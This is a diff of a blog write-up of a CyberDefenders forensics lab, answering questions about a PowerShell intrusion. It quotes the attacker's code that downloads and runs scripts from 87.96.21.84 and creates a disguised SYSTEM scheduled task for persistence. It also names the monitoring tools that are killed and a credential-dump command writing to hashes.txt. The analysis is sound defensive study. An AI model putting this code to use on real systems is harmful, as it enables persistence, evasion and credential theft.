@@ -4,7 +4,7 @@ draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-11T05:30:04.168Z
+lastmod: 2026-11-11T08:36:35.053Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -901,24 +901,67 @@ Inspecting the `checking.ps1` deeper, we can see that the script is using the fo
 
 **Q9. Can you determine the URL of the second file downloaded by the attacker?**
 
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794381368178-98daf7.png)
+
+`checking.ps1` then is called to download `del.ps1`, and then `ichigo-lite.ps1`. Filtering for `http` for a better view of the chronological order.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794381008104-69755d.png)
 
 `Answer: http://87.96.21.84/del.ps1`
 
-
 **Q10. Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?**
 
+In `checking.ps1` at the payload that download the next two files `del.ps1` and `ichigo-lite.ps1`
 
+```
+Function CleanerEtc {
+    $WebClient = New-Object System.Net.WebClient
+    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
+    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
+    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
+}
+```
 
+Notably, there is `schtasks.exe` - a command that creates a Windows Scheduled Task, which is commonplace in [MITRE ATT&CK Technique T1053.005](https://attack.mitre.org/techniques/T1053/005/). Moreover, it is designed to running a script automatically at every 4 hours `/sc HOURLY /mo 4` with the highest possible system privileges `/ru SYSTEM`, suggesting at the persistence tactic.
 
+`/tr` stands for task run, specifying the command or script to execute when the task triggers. In this case, it launches `Command Prompt (cmd.exe)` to run a PowerShell script `C:\ProgramData\del.ps1` with execution policies bypassed `-ExecutionPolicy Bypass`.
 
+`/tn` stands for task name, which is `"\Microsoft\Windows\MUI\LPupdate"` - the answer for the question.
 
+`Answer: \Microsoft\Windows\MUI\LPupdate`
 
+**Q11. Based on your analysis of the second malicious file, What is the MITRE ID of the main tactic the second file tries to accomplish?**
 
+The malicious file in question is `del.ps1`
 
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794383251008-01529d.png)
 
+As we can see, the script disables some of the functions using `stop-process -name $task -Force`. At first, I supposed it was [MITRE ID TA0112 (Defense Impairment)](https://attack.mitre.org/tactics/TA0112/). But to some extent, [MITRE ID TA0005 (Stealth/Defense Evasion)](https://attack.mitre.org/tactics/TA0005/) is a better fit, since the functions that were disabled are merely monitoring tools: 
+```
+"taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
+```
 
+`Answer: TA0005`
 
+**Q12. What's the invoked PowerShell script used by the attacker for dumping credentials?**
 
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794385112823-9fcbaf.png)
+
+`Answer: Invoke-PowerDump.ps1`
+
+**Q13. Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?**
+
+Inspecting `ichigo-lite.ps1`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794385479355-9f3dcf.png)
+
+- We know that the credentials are dumped using `Invoke-PowerDump.ps1`, and this `ichigo-lite.ps1` `DownloadString` from it.
+- And there is this encoded command `Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"` that seems to pipe the credentials into `hashes.txt`
+- And then those hashes get processed more afterwards.
+
+`Answer: hashes.txt`
+
+**Q14. Knowing the hosts targeted during the attacker's reconnaissance phase, the security team can prioritize their remediation efforts on these specific hosts. What's the name of the text file containing the discovered hosts?**
 
 
 
